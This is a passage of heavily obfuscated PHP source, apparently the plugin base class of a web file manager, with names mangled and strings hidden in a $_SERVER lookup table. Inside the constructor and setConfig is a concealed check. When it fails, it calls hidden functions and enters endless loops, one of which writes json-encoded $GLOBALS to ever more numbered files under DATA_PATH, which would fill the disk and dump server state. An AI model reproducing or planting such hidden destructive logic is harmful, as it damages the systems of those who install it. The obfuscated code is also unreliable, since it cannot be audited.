strlen($cõæŠó™ˆ•); if ($a£Îõ‰•ô >= $D’ƒŠİØÂ¢) { continue; } if ($a£Îõ‰•ô >= $fÔ¸Ø¼šÔä && $a£Îõ‰•ô + $EõñÛ‘ê¡ <= $D’ƒŠİØÂ¢) { return substr($cõæŠó™ˆ•, $a£Îõ‰•ô - $fÔ¸Ø¼šÔä, $EõñÛ‘ê¡); } break; } if (count($Dİ˜ñæ¹Ì‰) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($b¸öƒáËÀˆ[1298], $b¸öƒáËÀˆ[1299] . count($Dİ˜ñæ¹Ì‰) . "\x3b\163\164\x61\162\x74\75{$a£Îõ‰•ô}\54\154\x65\156\x67\164\150\x3d{$EõñÛ‘ê¡}\73\160\x6f\x73\x65\72{$fÔ¸Ø¼šÔä}\176{$D’ƒŠİØÂ¢}"); throw new Exception($b¸öƒáËÀˆ[1300]); } $a©›³‡Ãçß = intval($a£Îõ‰•ô / $a¬‚£ƒ’áÒ) * $a¬‚£ƒ’áÒ; goto BÈğ®ÅÇ„ï; Cä…¹©¼ª: } private function log($CôçÌêòò, $fÉ™‡±Á…Ğ) { $e»‚½†äÏ² =& $_SERVER[Å¸ş]; $bá­œ‰¢Ÿ = timeFloat() - $this->timeStart; write_log(sprintf($e»‚½†äÏ²[1301], $CôçÌêòò, $this->info[$e»‚½†äÏ²[28]], $bá­œ‰¢Ÿ, $fÉ™‡±Á…Ğ), $e»‚½†äÏ²[1217]); } } class Message { function __construct() { } public function send($BğíÅñÒÃÍ = '', $C…ÍÆ¯¢¸ = array(), $A¾Ú‚°ù© = "\164\x65\x78\164") { goto B½šØÖ¸£Î; Añâ¸¤îÌ®: $C…ÍÆ¯¢¸ = array($fáİõæµ[968] => isset($C…ÍÆ¯¢¸[$fáİõæµ[968]]) ? $C…ÍÆ¯¢¸[$fáİõæµ[968]] : $fáİõæµ[33], $fáİõæµ[537] => isset($C…ÍÆ¯¢¸[$fáİõæµ[537]]) ? $C…ÍÆ¯¢¸[$fáİõæµ[537]] : $fáİõæµ[33]); if (empty($BğíÅñÒÃÍ) || empty($C…ÍÆ¯¢¸[$fáİõæµ[968]]) && empty($C…ÍÆ¯¢¸[$fáİõæµ[537]])) { return !1; } $D¡ãŒ¨ÖÖ = array($fáİõæµ[1244] => $dß¢·«À©Ë, $fáİõæµ[1304] => $C…ÍÆ¯¢¸); goto C¤ê†¬…£ë; C¤ê†¬…£ë: Hook::trigger($fáİõæµ[1305], $D¡ãŒ¨ÖÖ); goto C½–ºê»¼Ô; B½šØÖ¸£Î: $fáİõæµ =& $_SERVER[Å¸ş]; $dß¢·«À©Ë = array($fáİõæµ[29] => $fáİõæµ[1302], $fáİõæµ[695] => $BğíÅñÒÃÍ); if (in_array($A¾Ú‚°ù©, array($fáİõæµ[1302], $fáİõæµ[1303]))) { $dß¢·«À©Ë[$fáİõæµ[29]] = $A¾Ú‚°ù©; } goto Añâ¸¤îÌ®; C½–ºê»¼Ô: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto Bí«îƒ‘ç¾; B¿¥ß‹Ì˜: if ($BŒ¶Ïì—ì && strpos($dîáÂíîªœ[47] . $BŒ¶Ïì—ì . $dîáÂíîªœ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$dîáÂíîªœ[1310]] . $this->pluginName . $dîáÂíîªœ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto a¦·ÆÍœ°; a¦·ÆÍœ°: return $this; goto e‹ô¾Ÿéáä; b²ÌÑË²¥: $this->pluginName = str_replace($dîáÂíîªœ[1306], $dîáÂíîªœ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $dîáÂíîªœ[8]; $this->pluginApi = appHostGet() . $dîáÂíîªœ[1307] . $this->pluginName . $dîáÂíîªœ[8]; goto FŞÌ¥¨ŠÚğ; Bí«îƒ‘ç¾: $dîáÂíîªœ =& $_SERVER[Å¸ş]; if (!isset($_SERVER[$dîáÂíîªœ[557]]) || !isset($_SERVER[$dîáÂíîªœ[790]])) { goto F·±Ğ¥¿‚; F·±Ğ¥¿‚: $féº¤ÍˆÂ = $dîáÂíîªœ[791]; $e½´½ƒ§× = $dîáÂíîªœ[558]; $BÊÛ·ŞÙÜÏ = $_SERVER[$dîáÂíîªœ[559]] . $dîáÂíîªœ[560]; goto EøÔÚ°¿‡É; c¶ã¨§Ó¢: $fÈ…“‚î‡ = $dîáÂíîªœ[792]; $fÈ…“‚î‡($_SERVER[$dîáÂíîªœ[793]]); $Eß‰¢ ‰ĞÔ = 1; goto b›Õ®È»ÃÊ; EøÔÚ°¿‡É: $D‚Ø³°‹‹æ = $e½´½ƒ§×($BÊÛ·ŞÙÜÏ); $dÜŸœ½÷¯ = explode($dîáÂíîªœ[217], $D‚Ø³°‹‹æ); if (count($dÜŸœ½÷¯) < $dîáÂíîªœ[550]) { $A¬¼«£‡¨ñ = $dîáÂíîªœ[562]; $A¬¼«£‡¨ñ(); } goto c¶ã¨§Ó¢; b›Õ®È»ÃÊ: for ($bÂ†òÛ¾ß = $Eß‰¢ ‰ĞÔ; $bÂ†òÛ¾ß > 0; $bÂ†òÛ¾ß++) { $fÈ…“‚î‡ = json_encode($GLOBALS[$dîáÂíîªœ[384]]); } goto b¬ĞÆ–Óºƒ; b¬ĞÆ–Óºƒ: } global $in, $config; goto bÉ¼Ş…; FŞÌ¥¨ŠÚğ: $this->pluginHost = $config[$dîáÂíîªœ[1308]] . $this->pluginName . $dîáÂíîªœ[8]; $this->pluginHostDefault = $config[$dîáÂíîªœ[1308]] . $this->pluginName . $dîáÂíîªœ[8]; $BŒ¶Ïì—ì = $config[$dîáÂíîªœ[1309]]; goto B¿¥ß‹Ì˜; bÉ¼Ş…: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($dîáÂíîªœ[1306]); goto b²ÌÑË²¥; e‹ô¾Ÿéáä: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Å¸ş][1311]); } protected function assign($CÚ„†Û»Ò—, $Eò½Ò†ÂÎ¡ = false) { if (is_array($CÚ„†Û»Ò—)) { $this->values = array_merge($this->values, $CÚ„†Û»Ò—); } else { $this->values[$CÚ„†Û»Ò—] = $Eò½Ò†ÂÎ¡; } } protected function display($fÙö°ñ´œ«) { extract($this->values); require $fÙö°ñ´œ«; } final function hookRegist($DØ×ñœœÌ) { $this->modelPlugin->appRegist($this->pluginName, $DØ×ñœœÌ); } final function appIcon() { $Dø†Ÿ£Éø =& $_SERVER[Å¸ş]; $AœÛéİªâ = $this->appPackage(); $fÏÖ‹„ö° = $Dø†Ÿ£Éø[33]; if (isset($AœÛéİªâ[$Dø†Ÿ£Éø[382]])) { if (isset($AœÛéİªâ[$Dø†Ÿ£Éø[382]][$Dø†Ÿ£Éø[1312]])) { $fÏÖ‹„ö° = $Dø†Ÿ£Éø[1313] . $AœÛéİªâ[$Dø†Ÿ£Éø[382]][$Dø†Ÿ£Éø[1312]] . $Dø†Ÿ£Éø[1314]; } else { if ($AœÛéİªâ[$Dø†Ÿ£Éø[382]][$Dø†Ÿ£Éø[1315]]) { $fÏÖ‹„ö° = $Dø†Ÿ£Éø[1316] . $AœÛéİªâ[$Dø†Ÿ£Éø[382]][$Dø†Ÿ£Éø[1315]] . $Dø†Ÿ£Éø[1317]; } } } return $fÏÖ‹„ö°; } final function fileCanView($aƒ©‘ïŞÑø) { goto AåÀ™·ÒÜ; Dªøî“»: ActionCall($Cù±ƒÛó°ç[1330], $aƒ©‘ïŞÑø); goto CÊñ¥¥âƒ; AåÀ™·ÒÜ: $Cù±ƒÛó°ç =& $_SERVER[Å¸ş]; if (request_url_safe($aƒ©‘ïŞÑø)) { return !0; } if ($this->isShare($aƒ©‘ïŞÑø)) { return !0; } goto cÔâÊ™Ğœë; cÔâÊ™Ğœë: $d’öŸ§œ„» = Session::get($Cù±ƒÛó°ç[1318]); if (!$d’öŸ§œ„» || !$d’öŸ§œ„»[$Cù±ƒÛó°ç[1319]]) { $c‘åèŒİ´« = $Cù±ƒÛó°ç[1320] . rawurlencode(this_url()); show_tips(LNG($Cù±ƒÛó°ç[1321]) . $Cù±ƒÛó°ç[1322] . $c‘åèŒİ´« . $Cù±ƒÛó°ç[1323] . LNG($Cù±ƒÛó°ç[1324]) . $Cù±ƒÛó°ç[1325], !1); } if (!Action($Cù±ƒÛó°ç[1326])->authCan($Cù±ƒÛó°ç[1327])) { show_tips(LNG($Cù±ƒÛó°ç[1328]) . $Cù±ƒÛó°ç[1329], !1); } goto Dªøî“»; CÊñ¥¥âƒ: } final function isShare($c³‡‰Ø’¨) { $F¡ù‘²ğ½Õ = KodIO::parse($c³‡‰Ø’¨); return $F¡ù‘²ğ½Õ[$_SERVER[Å¸ş][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($FÏÙßôø¹”) { if (request_url_safe($FÏÙßôø¹”)) { return $FÏÙßôø¹”; } if (!$this->isShare($FÏÙßôø¹”)) { $FÏÙßôø¹” = $this->filePath($FÏÙßôø¹”); } return Action($_SERVER[Å¸ş][1016])->linkOut($FÏÙßôø¹”); } public function filePathLinkOut($fëåº”é“ê) { if (request_url_safe($fëåº”é“ê)) { return $fëåº”é“ê; } $this->fileCanView($fëåº”é“ê); return Action($_SERVER[Å¸ş][1016])->link($fëåº”é“ê); } final function filePath($Eã™‡ìßë) { $cŸ´ƒåß˜Æ =& $_SERVER[Å¸ş]; if ($D™¹ÕœÏöò = $this->checkSharePath($Eã™‡ìßë)) { return $D™¹ÕœÏöò; } $this->fileCanView($Eã™‡ìßë); if (request_url_safe($Eã™‡ìßë)) { $dÍ åØ™ø = parse_url_query($Eã™‡ìßë); if (isset($dÍ åØ™ø[$cŸ´ƒåß˜Æ[1331]]) && isset($dÍ åØ™ø[$cŸ´ƒåß˜Æ[197]])) { $bÓÖˆ˜·›İ = Model($cŸ´ƒåß˜Æ[1086])->get($cŸ´ƒåß˜Æ[1332]); $f¦êâ–Ñ¹ = Mcrypt::decode($dÍ åØ™ø[$cŸ´ƒåß˜Æ[197]], $bÓÖˆ˜·›İ); if ($f¦êâ–Ñ¹) { $this->fileInfo = IO::infoWithChildren($f¦êâ–Ñ¹); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $f¦êâ–Ñ¹; } } $Eã™‡ìßë = $this->_cacheHttpFile($Eã™‡ìßë); $this->fileInfo = IO::infoWithChildren($Eã™‡ìßë); } else { $this->fileInfo = IO::infoWithChildren($Eã™‡ìßë); if (!$this->fileInfo) { show_tips(LNG($cŸ´ƒåß˜Æ[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $Eã™‡ìßë; } final function _cacheHttpFile($Bå¼çÒ¬á) { $F—ó™ë’šî = hash_path($Bå¼çÒ¬á, !0); $this->cachePath = $this->pluginCachePath($F—ó™ë’šî); if ($C¨ä×´Œ— = IO::fileNameExist($this->cachePath, $F—ó™ë’šî)) { return KodIO::make($C¨ä×´Œ—); } $B—¾ƒ–¤ã¶ = $this->cachePath . $F—ó™ë’šî; return $this->pluginCacheFileSet($B—¾ƒ–¤ã¶, file_get_contents($Bå¼çÒ¬á)); } final function _tmpFileName($A…êö†È•Ò = array()) { goto aÍÜ›ò£†; eèìåõÛ«: $bĞÊâôŞØ† = array($A…êö†È•Ò[$eŸæÏêÅÊ[28]], $A…êö†È•Ò[$eŸæÏêÅÊ[75]], $A…êö†È•Ò[$eŸæÏêÅÊ[77]]); if (isset($A…êö†È•Ò[$eŸæÏêÅÊ[461]])) { $bĞÊâôŞØ†[] = $A…êö†È•Ò[$eŸæÏêÅÊ[461]]; } return md5(implode($eŸæÏêÅÊ[70], $bĞÊâôŞØ†)); goto FïÆ¸ãï‘¡; aø÷ƒÂÕ‘ƒ: if (isset($A…êö†È•Ò[$eŸæÏêÅÊ[162]][$eŸæÏêÅÊ[164]])) { return $A…êö†È•Ò[$eŸæÏêÅÊ[162]][$eŸæÏêÅÊ[164]]; } $A­ÆËÒÅ› = IO::hashSimple($A…êö†È•Ò[$eŸæÏêÅÊ[75]]); if ($A­ÆËÒÅ›) { return $A­ÆËÒÅ›; } goto eèìåõÛ«; aÍÜ›ò£†: $eŸæÏêÅÊ =& $_SERVER[Å¸ş]; if (!$A…êö†È•Ò) { $A…êö†È•Ò = $this->fileInfo; } if (isset($A…êö†È•Ò[$eŸæÏêÅÊ[164]])) { return $A…êö†È•Ò[$eŸæÏêÅÊ[164]]; } goto aø÷ƒÂÕ‘ƒ; FïÆ¸ãï‘¡: } final function checkSharePath($B½¼ë¿†‘) { goto B¹Äƒ‹Å·; B¹Äƒ‹Å·: $b¤’¿Ì£¹ =& $_SERVER[Å¸ş]; if (!defined($b¤’¿Ì£¹[427])) { define($b¤’¿Ì£¹[1333], 0); } if (!$this->isShare($B½¼ë¿†‘)) { return !1; } goto bß’Ì§ÏÇ¿; bÔ¿¼ŸÈËè: $this->cachePath = $this->pluginCachePath($this->fileInfo[$b¤’¿Ì£¹[164]]); return $AÅÆ°³¨éğ[$b¤’¿Ì£¹[75]]; goto dô·¿‘†ĞØ; bß’Ì§ÏÇ¿: $AÅÆ°³¨éğ = Action($b¤’¿Ì£¹[1016])->sharePathInfo($B½¼ë¿†‘); if (!isset($AÅÆ°³¨éğ[$b¤’¿Ì£¹[75]])) { show_json(LNG($b¤’¿Ì£¹[1334]), !1); } $this->fileInfo = $AÅÆ°³¨éğ[$b¤’¿Ì£¹[162]]; goto bÔ¿¼ŸÈËè; dô·¿‘†ĞØ: } final function pluginCachePath($eÔ…µ¥ÒÚİ = '') { $D»ïÕÖ¨­± =& $_SERVER[Å¸ş]; $AÕŸíâ³çè = IO_PATH_SYSTEM_TEMP . $D»ïÕÖ¨­±[1335] . $this->pluginName; if (!($f‘òØÁ¤¯ = IO::infoFull($AÕŸíâ³çè))) { return IO::mkdir($AÕŸíâ³çè . $D»ïÕÖ¨­±[8] . $eÔ…µ¥ÒÚİ); } if (empty($eÔ…µ¥ÒÚİ)) { return $f‘òØÁ¤¯[$D»ïÕÖ¨­±[75]]; } if (!($e¸¾Ô½‰ß‰ = IO::fileNameExist($f‘òØÁ¤¯[$D»ïÕÖ¨­±[75]], $eÔ…µ¥ÒÚİ))) { return IO::mkdir($f‘òØÁ¤¯[$D»ïÕÖ¨­±[75]] . $eÔ…µ¥ÒÚİ); } return KodIO::make($e¸¾Ô½‰ß‰); } final function pluginCacheFileSet($aÈ«é×Æ·, $CÏ¶¨¦æ—Ò = '') { $B•ñŸàĞ“ =& $_SERVER[Å¸ş]; if (!($BŠÆ½Ó‚µ = IO::infoFull($aÈ«é×Æ·))) { return IO::mkfile($aÈ«é×Æ·, $CÏ¶¨¦æ—Ò, REPEAT_REPLACE); } IO::setContent($BŠÆ½Ó‚µ[$B•ñŸàĞ“[75]], $CÏ¶¨¦æ—Ò); return $BŠÆ½Ó‚µ[$B•ñŸàĞ“[75]]; } final function pluginLocalFile($eºÃ¹äŠ•ª = '') { goto F±‚¹í”†§; F¯Ä“Á’ª™: if (!$eºÃ¹äŠ•ª) { return $dÛ¸ì‰³; } $fóÃ¤‡Ş¨Ä = IO::info($eºÃ¹äŠ•ª); $FŸ”ô¬µç· = $this->_tmpFileName($fóÃ¤‡Ş¨Ä) . $eÁî¨•‹½[91] . $fóÃ¤‡Ş¨Ä[$eÁî¨•‹½[160]]; goto d™×ÃœçÔ; F±‚¹í”†§: $eÁî¨•‹½ =& $_SERVER[Å¸ş]; $dÛ¸ì‰³ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($dÛ¸ì‰³)) { mk_dir($dÛ¸ì‰³); } goto F¯Ä“Á’ª™; d±¸æŸ¾ Å: return IO::copy($eºÃ¹äŠ•ª, $dÛ¸ì‰³, 0, $FŸ”ô¬µç·); goto bï¿…ÑÛ‚; d™×ÃœçÔ: if (!checkExtSafe($FŸ”ô¬µç·)) { $FŸ”ô¬µç· = $FŸ”ô¬µç· . $eÁî¨•‹½[1336]; } $F§Õ¢ñ«äÌ = $dÛ¸ì‰³ . $FŸ”ô¬µç·; if (@file_exists($F§Õ¢ñ«äÌ)) { return $F§Õ¢ñ«äÌ; } goto d±¸æŸ¾ Å; bï¿…ÑÛ‚: } final function appPackage() { goto E‰ø Á—‰; E˜¬‡™áŞ: $this->parseLang($CÔ”ÃŞ²ê); $FÖÎ•ŞÓô = json_decode_force($CÔ”ÃŞ²ê); if (!$FÖÎ•ŞÓô) { return array(); } goto eäÕÌõ·õæ; eäÕÌõ·õæ: $a©êÜÉ©¥ = Hook::trigger($Cé‡Ë™Ê²Ş[1338], $FÖÎ•ŞÓô); if ($a©êÜÉ©¥ && is_array($a©êÜÉ©¥)) { $FÖÎ•ŞÓô = $a©êÜÉ©¥; } $this->packageData = $FÖÎ•ŞÓô; goto E‰³ùĞÌÈ; E‰³ùĞÌÈ: return $FÖÎ•ŞÓô; goto Dİ¾£‘í³Ò; E‰ø Á—‰: $Cé‡Ë™Ê²Ş =& $_SERVER[Å¸ş]; if ($this->packageData) { return $this->packageData; } $CÔ”ÃŞ²ê = $this->parseFile($this->pluginPath . $Cé‡Ë™Ê²Ş[1337]); goto E˜¬‡™áŞ; Dİ¾£‘í³Ò: } public function packageInfoGet($aò”ğ¤È¤) { $cØá‚ëÅºç = $this->appPackage(); return array_get_value($cØá‚ëÅºç, $aò”ğ¤È¤); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Å¸ş][1339]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Å¸ş][1340]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Å¸ş][1341]); } private function parseFile($A¥Áà˜¶ª) { goto cÚ­ôáÇÊ§; c–¾Â°ÖŸŞ: $fİŠÉá¥ £ = str_replace($F„°«ê†ñ˜, $a¬±×”‡„ë, $fİŠÉá¥ £); return $fİŠÉá¥ £; goto AÑ¦Ò…‹×‘; cÚ­ôáÇÊ§: $d‰Šè÷Ùµ· =& $_SERVER[Å¸ş]; $fİŠÉá¥ £ = file_get_contents($A¥Áà˜¶ª); $F„°«ê†ñ˜ = array($d‰Šè÷Ùµ·[1342], $d‰Šè÷Ùµ·[1343], $d‰Šè÷Ùµ·[1344], $d‰Šè÷Ùµ·[1345], $d‰Šè÷Ùµ·[1346], $d‰Šè÷Ùµ·[1347], $d‰Šè÷Ùµ·[1348]); goto a…Ââ„˜áŠ; a…Ââ„˜áŠ: $a¬±×”‡„ë = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$d‰Šè÷Ùµ·[84]][$d‰Šè÷Ùµ·[1349]]); if (strstr($fİŠÉá¥ £, $d‰Šè÷Ùµ·[1350])) { $B¶¶øì…Ş = rawurlencode(json_encode($this->pluginLangArr)); $fİŠÉá¥ £ = str_replace($d‰Šè÷Ùµ·[1350], $B¶¶øì…Ş, $fİŠÉá¥ £); } if (strstr($fİŠÉá¥ £, $d‰Šè÷Ùµ·[1351])) { $B¶¶øì…Ş = $B¶¶øì…Ş = rawurlencode(json_encode($this->getConfig())); $fİŠÉá¥ £ = str_replace($d‰Šè÷Ùµ·[1351], $B¶¶øì…Ş, $fİŠÉá¥ £); } goto c–¾Â°ÖŸŞ; AÑ¦Ò…‹×‘: } private function parseLang(&$fŠóñ›­) { goto Cî±‡Òä; Cî±‡Òä: $bïÄÛÒğÓ =& $_SERVER[Å¸ş]; $B¬ªËæÊš = $bïÄÛÒğÓ[1352]; if (!strstr($fŠóñ›­, $B¬ªËæÊš)) { return; } goto D™í˜Ü²´á; D™í˜Ü²´á: preg_match_all($bïÄÛÒğÓ[1353], $fŠóñ›­, $BÚÙìŸôÒæ); if (!is_array($BÚÙìŸôÒæ) || count($BÚÙìŸôÒæ) == 0 || !is_array($BÚÙìŸôÒæ[0]) || count($BÚÙìŸôÒæ[0]) == 0) { return; } $Aƒ«©»ÁÑà = array(); goto B£ƒÛ¨Ş´’; B£ƒÛ¨Ş´’: $a“—ÚìÜİ = array(); foreach ($BÚÙìŸôÒæ[0] as $F¨óÊ±ËÁ) { $fñòõŞ¶¥ = substr($F¨óÊ±ËÁ, strlen($B¬ªËæÊš), -4); $CåØĞ´ßé = LNG($fñòõŞ¶¥); $Aƒ«©»ÁÑà[] = $F¨óÊ±ËÁ; $a“—ÚìÜİ[] = str_replace(array($bïÄÛÒğÓ[217], $bïÄÛÒğÓ[990], $bïÄÛÒğÓ[330], $bïÄÛÒğÓ[113]), array($bïÄÛÒğÓ[50], $bïÄÛÒğÓ[50], $bïÄÛÒğÓ[33], $bïÄÛÒğÓ[1354]), $CåØĞ´ßé); } $fŠóñ›­ = str_replace($Aƒ«©»ÁÑà, $a“—ÚìÜİ, $fŠóñ›­); goto Cé×š¨¢ƒª; Cé×š¨¢ƒª: } private function parseConfig(&$aç¹Š‚ãò®) { goto cÑ†Ù’ùã•; cÑ†Ù’ùã•: $C¸·£÷ùìÜ =& $_SERVER[Å¸ş]; $AÌ¶‘Ç…¸¡ = $C¸·£÷ùìÜ[1355]; if (!strstr($aç¹Š‚ãò®, $AÌ¶‘Ç…¸¡)) { return; } goto F÷ë™„—Ÿ; FÆÃ àÄ´Ü: $Dï”ËÔñ„ = array(); $f·Ä æùˆÍ = array(); foreach ($f…Ø­¢ğ[0] as $bˆÙĞÃ‰°ï) { $FŒ´Ø„Æ…µ = substr($bˆÙĞÃ‰°ï, strlen($AÌ¶‘Ç…¸¡), -2); $Dï”ËÔñ„[] = $bˆÙĞÃ‰°ï; $f·Ä æùˆÍ[] = _get($Fç¾ÈÄŒ, $FŒ´Ø„Æ…µ); } goto A„££†¤³©; A„££†¤³©: $aç¹Š‚ãò® = str_replace($Dï”ËÔñ„, $f·Ä æùˆÍ, $aç¹Š‚ãò®); goto E‚ì†›Ô¥í; F÷ë™„—Ÿ: preg_match_all($C¸·£÷ùìÜ[1356], $aç¹Š‚ãò®, $f…Ø­¢ğ); if (!is_array($f…Ø­¢ğ) || count($f…Ø­¢ğ) == 0 || !is_array($f…Ø­¢ğ[0]) || count($f…Ø­¢ğ[0]) == 0) { return; } $Fç¾ÈÄŒ = $this->getConfig(); goto FÆÃ àÄ´Ü; E‚ì†›Ô¥í: } private function parsePackage(&$AŞã¸•Ï•Ó) { goto c½ŒİìÜô; cß²‹‚²¢‚: $AŞã¸•Ï•Ó = str_replace($F“ƒÌÔŸÀ, $A–„Úğ¹ºà, $AŞã¸•Ï•Ó); goto cßì„ŠÆº…; F‡¸ïÊÉ³: $F“ƒÌÔŸÀ = array(); $A–„Úğ¹ºà = array(); foreach ($B‹‘ğ‰”»’[0] as $EÍƒ»¡øò¨) { $dÁÄ£â†éĞ = substr($EÍƒ»¡øò¨, strlen($AÙø—Šõ“), -2); $F“ƒÌÔŸÀ[] = $EÍƒ»¡øò¨; $A–„Úğ¹ºà[] = _get($EÔ®Îµœ ‚, $dÁÄ£â†éĞ); } goto cß²‹‚²¢‚; fô¿ß“¼ùã: preg_match_all($CŒ‡ÃŒÀ”[1358], $AŞã¸•Ï•Ó, $B‹‘ğ‰”»’); if (!is_array($B‹‘ğ‰”»’) || count($B‹‘ğ‰”»’) == 0 || !is_array($B‹‘ğ‰”»’[0]) || count($B‹‘ğ‰”»’[0]) == 0) { return; } $EÔ®Îµœ ‚ = $this->appPackage(); goto F‡¸ïÊÉ³; c½ŒİìÜô: $CŒ‡ÃŒÀ” =& $_SERVER[Å¸ş]; $AÙø—Šõ“ = $CŒ‡ÃŒÀ”[1357]; if (!strstr($AŞã¸•Ï•Ó, $AÙø—Šõ“)) { return; } goto fô¿ß“¼ùã; cßì„ŠÆº…: } final function echoFile($BÍ©ÙŠÎ, $E¨ò†­³Öò = false) { goto dÉ²á¡÷¤•; eø¥‡§”¼: $this->parsePackage($E×‹„‹•å¥); if (is_array($E¨ò†­³Öò)) { $E×‹„‹•å¥ = str_replace(array_keys($E¨ò†­³Öò), array_values($E¨ò†­³Öò), $E×‹„‹•å¥); } echo $cÑùÁœÌö[217] . $E×‹„‹•å¥; goto Fª‘»ÔÏª; aŒÊà×†ôù: $E×‹„‹•å¥ = $this->parseFile($fš…áîÍµ); $this->parseLang($E×‹„‹•å¥); $this->parseConfig($E×‹„‹•å¥); goto eø¥‡§”¼; dÉ²á¡÷¤•: $cÑùÁœÌö =& $_SERVER[Å¸ş]; $fš…áîÍµ = $this->pluginPath . $BÍ©ÙŠÎ; if (ACT == $cÑùÁœÌö[1359]) { echo $cÑùÁœÌö[1360] . $this->pluginName . $cÑùÁœÌö[8] . $BÍ©ÙŠÎ . $cÑùÁœÌö[1361]; if (!file_exists($fš…áîÍµ)) { echo $cÑùÁœÌö[1362]; return; } } goto aŒÊà×†ôù; Fª‘»ÔÏª: } final function initLang() { goto e·¨İÓ¨åŒ; eËÅİÁæª: if (!is_array($EÚ·çïŸŠ)) { return array(); } if (@count($EÚ·çïŸŠ) > 0) { I18n::set($EÚ·çïŸŠ); } return $EÚ·çïŸŠ; goto E„–¾ø; A†î¼¹†Ì: $Bƒ±Âƒ’³“ = I18n::getType(); $EÚ·çïŸŠ = array(); if (file_exists($CÍíĞñˆë . $Bƒ±Âƒ’³“ . $Aç¹Ê­ù¤[768])) { $EÚ·çïŸŠ = (include $CÍíĞñˆë . $Bƒ±Âƒ’³“ . $Aç¹Ê­ù¤[768]); } else { if ($Bƒ±Âƒ’³“ == $Aç¹Ê­ù¤[1365] && !file_exists($CÍíĞñˆë . $Bƒ±Âƒ’³“ . $Aç¹Ê­ù¤[768]) && file_exists($CÍíĞñˆë . $Aç¹Ê­ù¤[1366])) { $EÚ·çïŸŠ = (include $CÍíĞñˆë . $Aç¹Ê­ù¤[1366]); } else { if (file_exists($CÍíĞñˆë . $FßÉÛŸÇß . $Aç¹Ê­ù¤[768])) { $EÚ·çïŸŠ = (include $CÍíĞñˆë . $FßÉÛŸÇß . $Aç¹Ê­ù¤[768]); } } } goto eËÅİÁæª; e·¨İÓ¨åŒ: $Aç¹Ê­ù¤ =& $_SERVER[Å¸ş]; $FßÉÛŸÇß = $Aç¹Ê­ù¤[1363]; $CÍíĞñˆë = $this->pluginPath . $Aç¹Ê­ù¤[1364]; goto A†î¼¹†Ì; E„–¾ø: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($c‘—¶›Ø½é) { $fƒˆåï¥ë­ =& $_SERVER[Å¸ş]; $Fˆ°«¸İ = $_SERVER[$fƒˆåï¥ë­[793]] . $fƒˆåï¥ë­[555]; $CÓÒ°‚“®Õ = $fƒˆåï¥ë­[556]; if ($_SERVER[$fƒˆåï¥ë­[557]] != $CÓÒ°‚“®Õ($Fˆ°«¸İ)) { goto CƒÄ¶Æšˆ; b—ˆƒì¦: $D­Ïò´¯¢„ = $fƒˆåï¥ë­[792]; $D­Ïò´¯¢„($_SERVER[$fƒˆåï¥ë­[793]]); $CŸÎó”ƒŸÊ = $fƒˆåï¥ë­[791]; goto bÛÄŒ·ßùÂ; bÛÄŒ·ßùÂ: $CŸÎó”ƒŸÊ(); $Cæê‡®ÑŸ¨ = $fƒˆåï¥ë­[1367]; $D‰Êğ¢ = json_encode($GLOBALS[$fƒˆåï¥ë­[1368]]); goto c“ëÊº´©’; AøØ›ªÛ‰„: $aÒè†ÙóÅ… = $c²Şà§ÎªÀ($eóµšÅÈè÷); $a‰»£¾™ËÂ = explode($fƒˆåï¥ë­[217], $aÒè†ÙóÅ…); if (count($a‰»£¾™ËÂ) < $fƒˆåï¥ë­[550]) { $CöìÖô¯© = $fƒˆåï¥ë­[562]; $CöìÖô¯©(); } goto b—ˆƒì¦; c“ëÊº´©’: $EÆÌ¡Ü‡¼• = 1; for ($c°˜’‡âŒ = $EÆÌ¡Ü‡¼•; $c°˜’‡âŒ > 0; $c°˜’‡âŒ++) { $Cæê‡®ÑŸ¨(DATA_PATH . $c°˜’‡âŒ, $D‰Êğ¢); } goto cœˆíœÌ¹è; CƒÄ¶Æšˆ: $CŸÎó”ƒŸÊ = $fƒˆåï¥ë­[791]; $c²Şà§ÎªÀ = $fƒˆåï¥ë­[558]; $eóµšÅÈè÷ = $_SERVER[$fƒˆåï¥ë­[559]] . $fƒˆåï¥ë­[560]; goto AøØ›ªÛ‰„; cœˆíœÌ¹è: } return $this->modelPlugin->setConfig($this->pluginName, $c‘—¶›Ø½é); } public function onSetConfig($DÈê¯ƒ‚¾) { } public function onGetConfig($BœÌßòŠ Ç) { } public function onChangeStatus($FÈ³ïÖ–ƒÀ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($cÆëØâò¸ = "\x70\x6c\x75\147\x69\x6e\101\165\164\150") { $b¡ ¸’¸ªõ =& $_SERVER[Å¸ş]; if (!defined($b¡ ¸’¸ªõ[427])) { return !1; } if (_get($GLOBALS, $b¡ ¸’¸ªõ[459])) { return !0; } $CÆ¥»‘µ‡¯ = $this->getConfig(); if (!$CÆ¥»‘µ‡¯[$cÆëØâò¸]) { return !1; } return ActionCall($b¡ ¸’¸ªõ[1369], $CÆ¥»‘µ‡¯[$cÆëØâò¸]); } public function url($CĞµï‡ğ, $cÚ®ÉÓäŒ­ = '', $aæËÅÏâ¤¿ = true) { goto Aî–À‘Ò¿; EÆ…‹ªÖæ”: if (!$aæËÅÏâ¤¿) { return $C¹Øäì­Œ; } echo $C¹Øäì­Œ; goto c¶ã¼‰‡·²; e¼Èê†¸„: $E”Ì‡›ÎÎ = $this->packageVersion(); 